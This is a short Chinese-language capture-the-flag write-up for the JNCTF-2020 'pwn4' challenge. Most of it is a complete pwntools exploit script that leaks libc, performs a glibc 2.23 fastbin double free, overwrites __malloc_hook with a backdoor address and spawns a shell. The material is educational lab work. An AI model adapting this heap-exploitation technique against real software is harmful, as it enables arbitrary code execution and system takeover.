# JNCTF-2020 : jnctf_2020_pwn4

## **【原理】**
glibc2.23 下的double free

## **【目的】**
getshell

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,ida,gdb

## **【步骤】**

打__malloc_hook，填充入后门函数。


```python

from pwn import*
context.log_level = 'debug'
p = process('./jnctf_2020_pwn4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./jnctf_2020_pwn4')
backdoor = 0x04008D6
def create(index,size,content):
	p.sendlineafter('>','1')
	p.sendlineafter(':',str(index))
	p.sendlineafter(':',str(size))
	p.sendafter(':',content)
def delete(index):
	p.sendlineafter('>','2')
	p.sendlineafter(':',str(index))
def show(index):
	p.sendlineafter('>','3')
	p.sendlineafter(':',str(index))
def pr(a,addr):
	log.success(a+'===>'+hex(addr))

create(1,0x80,'\x00')
create(2,0x68,'\x00')
delete(1)
show(1)
p.recvuntil('girlfriendname:')
leak = u64(p.recv(6)+'\x00\x00')
libcbase = leak - (0x7f6010acbb78-0x7f6010707000)
system = libcbase + libc.sym['system']
malloc_hook = libcbase + libc.sym['__malloc_hook']
pr('libcbase',libcbase)
pr('system',system)
pr('malloc_hook',malloc_hook)

create(15,0x80,'\x00')
create(3,0x68,'\x00')
delete(2)
delete(3)
delete(2)
create(4,0x68,p64(malloc_hook-0x23))
create(5,0x68,'\x00')
create(6,0x68,'\x00')
create(7,0x68,'a'*0x13+p64(backdoor))
#gdb.attach(p)
p.sendlineafter('>','1')
p.sendlineafter(':','0')
p.sendlineafter(':','16')

p.interactive()




```

## **【总结】**
非常基础的堆。